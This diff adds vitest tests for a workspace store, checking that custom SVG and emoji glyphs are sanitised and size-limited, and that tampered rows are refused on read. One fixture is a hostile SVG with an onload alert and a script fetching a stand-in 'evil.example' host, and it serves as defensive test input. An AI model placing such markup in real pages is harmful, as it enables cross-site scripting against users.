@@ -2,6 +2,7 @@ import { beforeEach, describe, expect, it } from "vitest";
 import { openDb } from "../src/core/db.js";
 import { migrateWorkspace } from "../src/core/schema.js";
 import { WorkspaceStore } from "../src/core/store.js";
+import { sanitizeSvg } from "../src/core/svg-sanitize.js";
 import { ISSUE_KINDS, ISSUE_STATUSES, StapleError } from "../src/core/types.js";
 
 /**
@@ -724,7 +725,7 @@ describe("kind appearance", () => {
       /"kinds\.appearance" must be an appearance record without "color"/,
     );
     expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: "<svg/>", fallback: "s" } })).toThrow(
-      /sanitiser/,
+      /viewBox/,
     );
     expect(() => store.setSetting("kinds.appearance", { epic: { ...flask, value: "Not A Key" } })).toThrow(
       /Lucide icon key .* for "epic"/,
@@ -749,5 +750,66 @@ describe("kind appearance", () => {
       .prepare("INSERT INTO meta (key, value) VALUES ('setting:kinds.appearance', ?)")
       .run(JSON.stringify({ v: 1, value: { epic: { source: "lucide" } } }));
     expect(() => store.getKindsWithAppearance()).toThrow(/workspace test: "kinds\.appearance" must be/);
+  });
+});
+
+// ------------------------------------------------------- custom glyphs (R5c, STA-183)
+
+describe("custom glyphs", () => {
+  const metaRows = () =>
+    (store.db.prepare("SELECT value FROM meta WHERE key = 'setting:kinds.appearance'").all() as Array<{ value: string }>).map(
+      (row) => row.value,
+    );
+  const raw = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M4 2h16v20H4z" fill="#f00"/></svg>';
+  const hostile = '<svg viewBox="0 0 24 24" onload="alert(1)"><script>fetch("https://evil.example")</script><path d="M0 0"/></svg>';
+  const canonical = () => {
+    const result = sanitizeSvg(raw, { label: "Box" });
+    if (!result.ok) throw new Error(result.problem);
+    return result.svg;
+  };
+
+  it("stores the sanitiser's canonical output and resolves it on every read, never the raw document", () => {
+    store.setSetting("kinds.appearance", { epic: { source: "svg", value: canonical(), fallback: "▣" } }, "op");
+    expect(store.kindAppearance("epic")).toEqual({ source: "svg", value: canonical(), label: "Epic", fallback: "▣" });
+    expect(store.getKindsWithAppearance().find((k) => k.id === "epic")!.appearance.value).toBe(canonical());
+    // What sits on disk is the canonical string: no width/height, currentColor, one title.
+    const onDisk = (JSON.parse(metaRows()[0]!) as { value: { epic: { value: string } } }).value.epic.value;
+    expect(onDisk).toBe(canonical());
+    expect(onDisk).toContain('fill="currentColor"');
+    expect(onDisk).not.toMatch(/width=|#f00/);
+    expect(onDisk).toContain("<title>Box</title>");
+  });
+
+  it("refuses a raw or hostile document at the write boundary, and no markup reaches disk", () => {
+    expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: raw, fallback: "s", label: "Box" } })).toThrow(
+      /"kinds\.appearance" must be the sanitiser's canonical SVG for value .* for "epic"/,
+    );
+    expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: hostile, fallback: "s" } })).toThrow(
+      /must be an SVG without <script> elements for value/,
+    );
+    expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: "<svg>" + "a".repeat(1024 * 1024), fallback: "s" } })).toThrow(
+      /at most 8192 bytes/,
+    );
+    expect(() => store.setSetting("kinds.appearance", { epic: { source: "emoji", value: "🚀🚀🚀", fallback: "e" } })).toThrow(
+      /1 to 2 visible characters/,
+    );
+    expect(metaRows()).toEqual([]);
+    expect(store.kindAppearance("epic").value).toBe("layers");
+  });
+
+  it("accepts an emoji by grapheme count: a joined family is one glyph", () => {
+    store.setSetting("kinds.appearance", { epic: { source: "emoji", value: "👨‍👩‍👧‍👦", fallback: "F" } });
+    expect(store.kindAppearance("epic")).toEqual({ source: "emoji", value: "👨‍👩‍👧‍👦", label: "Epic", fallback: "F" });
+  });
+
+  it("never serves a stored row that was tampered into hostile markup: the read refuses with the key in the sentence", () => {
+    // The registry validates at the read boundary (R5a), so a hand-edited row cannot be served as
+    // markup by any surface. The resolver's own fallback for a record it is handed is proven in
+    // test/kind-appearance.test.ts; the browser's is in SafeGlyph's tests.
+    store.db
+      .prepare("INSERT INTO meta (key, value) VALUES ('setting:kinds.appearance', ?)")
+      .run(JSON.stringify({ v: 1, value: { epic: { source: "svg", value: hostile, fallback: "s" } } }));
+    expect(() => store.getKindsWithAppearance()).toThrow(/"kinds\.appearance" must be an SVG without <script> elements/);
+    expect(() => store.kindAppearance("epic")).toThrow(/<script>/);
   });
 });
